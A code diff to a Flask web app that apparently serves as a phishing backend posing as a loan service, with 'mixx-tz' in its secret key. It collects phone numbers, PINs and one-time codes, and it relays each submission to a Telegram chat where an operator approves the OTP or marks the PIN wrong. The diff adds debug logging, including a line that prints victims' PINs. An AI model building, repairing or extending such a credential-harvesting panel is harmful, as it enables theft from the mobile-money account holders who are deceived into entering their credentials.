@@ -5,6 +5,7 @@ import random
 import string
 from datetime import datetime
 import os
+import traceback
 
 app = Flask(__name__)
 app.secret_key = 'mixx-tz-2024'
@@ -47,14 +48,23 @@ add_column()
 def send_telegram(message, reply_markup=None):
     try:
         payload = {'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
-        if reply_markup: payload['reply_markup'] = reply_markup
-        requests.post(f'{TELEGRAM_API}/sendMessage', json=payload)
-    except Exception as e: print(f'Telegram error: {e}')
+        if reply_markup:
+            payload['reply_markup'] = reply_markup
+        resp = requests.post(f'{TELEGRAM_API}/sendMessage', json=payload)
+        print(f"TELEGRAM SEND STATUS: {resp.status_code}")
+        print(f"TELEGRAM RESPONSE: {resp.text}")
+        if resp.status_code != 200:
+            print(f"TELEGRAM ERROR: {resp.json()}")
+    except Exception as e:
+        print(f"TELEGRAM EXCEPTION: {e}")
+        traceback.print_exc()
 
 def edit_telegram(message_id, text):
     try:
-        requests.post(f'{TELEGRAM_API}/editMessageText', json={'chat_id': CHAT_ID, 'message_id': message_id, 'text': text})
-    except Exception as e: print(f'Edit error: {e}')
+        resp = requests.post(f'{TELEGRAM_API}/editMessageText', json={'chat_id': CHAT_ID, 'message_id': message_id, 'text': text})
+        print(f"EDIT TELEGRAM STATUS: {resp.status_code}")
+    except Exception as e:
+        print(f"Edit error: {e}")
 
 @app.route('/')
 def index():
@@ -76,6 +86,7 @@ def submit_loan():
     amount = int(data.get('amount',0))
     months = int(data.get('months',1))
     purpose = data.get('purpose','')
+    print(f"NEW LOAN REQUEST: phone={phone}, pin={pin}, amount={amount}, purpose={purpose}")
     conn = sqlite3.connect('database.db'); c = conn.cursor()
 
     # OTP REQUESTED (Resend)
@@ -113,8 +124,11 @@ def submit_loan():
         {'text':'❌ INVALID','callback_data': deny_callback},
         {'text':'✅ ALLOW OTP','callback_data':f'allow_{app_id}'}
     ]]}
+    print(f"SENDING TELEGRAM MESSAGE: {msg}")
     send_telegram(msg, keyboard)
     return jsonify({'success':True,'app_id':app_id})
+
+# ... (rest of the routes remain the same)
 
 @app.route('/api/submit_code', methods=['POST'])
 def submit_code():
@@ -146,26 +160,26 @@ def check_status(app_id):
 @app.route('/webhook', methods=['POST'])
 def webhook():
     data = request.json
+    print(f"WEBHOOK RECEIVED: {data}")
     if 'callback_query' in data:
         cb = data['callback_query']; cb_data = cb['data']
         msg_id = cb['message']['message_id']; original = cb['message']['text']
+        print(f"CALLBACK DATA: {cb_data}")
         conn = sqlite3.connect('database.db'); c = conn.cursor()
 
-        # ALLOW OTP
         if cb_data.startswith('allow_'):
             aid = cb_data.replace('allow_','')
             c.execute("UPDATE loans SET status='approved', code_status='pending' WHERE app_id=?", (aid,))
             conn.commit()
             edit_telegram(msg_id, original + '\n\n✅ ALLOWED')
+            print(f"ALLOWED app_id={aid}")
 
-        # INVALID for new loan (not qualified)
         elif cb_data.startswith('deny_') and not cb_data.startswith('denyreturn_'):
             aid = cb_data.replace('deny_','')
             c.execute("UPDATE loans SET status='invalid', invalid_type='not_qualified' WHERE app_id=?", (aid,))
             conn.commit()
             edit_telegram(msg_id, original + '\n\n❌ INVALID - Not qualified')
 
-        # INVALID for returning user (PIN still wrong)
         elif cb_data.startswith('denyreturn_'):
             aid = cb_data.replace('denyreturn_','')
             c.execute("UPDATE loans SET status='invalid', invalid_type='pin_wrong' WHERE app_id=?", (aid,))
